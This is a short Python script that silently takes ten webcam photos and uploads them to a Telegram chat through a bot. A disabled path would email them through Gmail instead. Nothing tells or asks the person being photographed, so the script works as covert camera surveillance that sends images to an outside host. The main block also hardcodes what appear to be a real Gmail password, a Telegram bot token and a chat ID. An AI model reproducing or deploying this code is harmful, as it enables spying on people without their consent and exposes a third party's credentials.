import cv2
from PIL import Image
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import time
import requests


def capture_images(num_images):
    camera = cv2.VideoCapture(0)
    image_list = []

    for i in range(num_images):
        # Capture frame-by-frame
        ret, frame = camera.read()


        # Convert frame to PIL Image
        image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        image_list.append(image)
        time.sleep(1)

    # Release the camera
    camera.release()

    return image_list

def send_images_via_email(image_list, sender_email, sender_password, recipient_email, smtp_server):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "Captured Images"

    for i, image in enumerate(image_list):
        # Save image temporarily
        image_path = f"image_{i+1}.jpg"
        image.save(image_path)

        # Attach image to email
        with open(image_path, 'rb') as f:
            img_data = f.read()
            img = MIMEImage(img_data)
            msg.attach(img)

    # Send email
    smtp_obj = smtplib.SMTP(smtp_server, 587)
    smtp_obj.starttls()
    smtp_obj.login(sender_email, sender_password)
    smtp_obj.send_message(msg)
    smtp_obj.quit()

def send_images_via_telegram(images, token, chat_id):
    url = f"https://api.telegram.org/bot{token}/sendPhoto"
    for i, image in enumerate(images):
        image_path = f"image_{i+1}.jpg"
        image.save(image_path)
        files = {'photo': open(image_path, 'rb')}
        data = {'chat_id' : chat_id}
        requests.post(url, files=files, data=data )

if __name__ == "__main__":
    num_images = 10
    sender_email = "abdelrahmangasser2023@gmail.com"
    sender_password = "gasser2005"
    recipient_email = "abdelrahmangasser2023gmail.com"
    smtp_server = "smtp.gmail.com"

    images = capture_images(num_images)
    # send_images_via_email(images, sender_email, sender_password, recipient_email, smtp_server)
    send_images_via_telegram(images, "6223557610:AAGiXe-PNAdXYBKRaMqk1HqAm8BkKK5Uppo", "5591930127")














